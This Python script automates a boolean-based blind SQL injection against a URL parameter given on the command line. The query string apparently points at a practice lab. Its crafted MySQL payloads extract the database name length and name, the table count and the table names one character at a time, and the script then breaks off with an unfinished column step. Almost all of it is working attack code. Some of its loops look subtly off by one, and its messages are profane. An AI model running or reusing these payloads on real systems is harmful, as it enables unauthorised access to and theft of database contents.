import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url',type=str,help='Specifies the URL(write the url with scheme!)')
parser.add_argument('-p', '--param', type=str, help='Specifies the parameter(write parameter with a true value!)')
args =parser.parse_args()

alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n','o', 'p','q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','_', '$']
#Get the database name character length
def getDBlength():
    default = requests.get(f"{args.url}?Submit=Submit&{args.param}%27+and+1%3Dif%28length%28database%28%29%29%3E0%2C1%2C0%29%23")
    for num in range(100):
        res = requests.get(f"{args.url}?Submit=Submit&{args.param}%27+and+1%3Dif%28length%28database%28%29%29%3E{num}%2C1%2C0%29%23")
        if(default.text!=res.text):
            return num +1            
#Get database name
def getDBname():    
    dbNum = getDBlength()
    dbName = ''
    default = requests.get(f"{args.url}?Submit=Submit&{args.param}%27+and+%28select+substring%28database%28%29%2C+100%2C+1%29%29+%3D+%27j%27%23")
    for num in range(dbNum):
        for word in alphabet:
            res = requests.get(f"{args.url}?Submit=Submit&{args.param}%27+and+%28select+substring%28database%28%29%2C+{num}%2C+1%29%29+%3D+%27{word}%27%23")
            if(default.text!=res.text):
                dbName += word
    return dbName
#Get the table count
def getTableCount():
    default = requests.get(f'{args.url}?Submit=Submit&{args.param}%27+and+%28select+count%28*%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29%29%3D0%23')
    for num in range(150):
        res = requests.get(f'{args.url}?Submit=Submit&{args.param}%27+and+%28select+count%28*%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29%29%3D{num}%23')
        if(default.text != res.text):
            return num            
# Get table names character length
def getTableLength():   
    global tablesLength
    tablesLength = [] 
    tableCount = getTableCount()
    default = requests.get(f'{args.url}?Submit=Submit&{args.param}%27+and+%28select+length%28table_name%29+from+information_schema.tables+where+table_schema+%3D+database%28%29+limit+0%2C1%29+%3E+1%23')
    for tableNum in range(tableCount):
        for num in range(1,100):
            res = requests.get(f'{args.url}?Submit=Submit&{args.param}%27+and+%28select+length%28table_name%29+from+information_schema.tables+where+table_schema+%3D+database%28%29+limit+{tableNum}%2C1%29+%3E+{num}%23')        
            if(default.text != res.text):
                tablesLength.append(num)
                break
    return tablesLength
#Get the tables name
def getTableName():
    global tableNames
    tableNames = []
    tableCount = getTableCount()
    getTableLength()    
    default = requests.get(f'{args.url}?Submit=Submit&{args.param}%27+and+substring%28%28select+table_name+from+information_schema.tables+where+table_schema+%3D+database%28%29+limit+0%2C1%29%2C150%2C1%29%3D%27j%27%23')
    for tableNum in range(tableCount):    
        tableNames.append("")    
        for num in range(tablesLength[tableNum]):
            for word in alphabet:
                res = requests.get(f'{args.url}?Submit=Submit&{args.param}%27+and+substring%28%28select+table_name+from+information_schema.tables+where+table_schema+%3D+database%28%29+limit+{tableNum}%2C1%29%2C{num}%2C1%29%3D%27{word}%27%23')
                if(default.text != res.text):
                    tableNames[tableNum] += word
    return tableNames
    
#Get columns count
def getColumnCount():
    print('')

#Go find it blind man!
if(args.url and args.param):            
        print(f"Database name => {getDBname()}\nTable names => {getTableName()}") 
        SelectedTable = input("Select one of the tables :")   
        
elif(args.url):
    print("Give me the fucking parameter! Otherwise i can't see...did you forget that i'm blind??")
else:
    print("What tha fuck should i do?")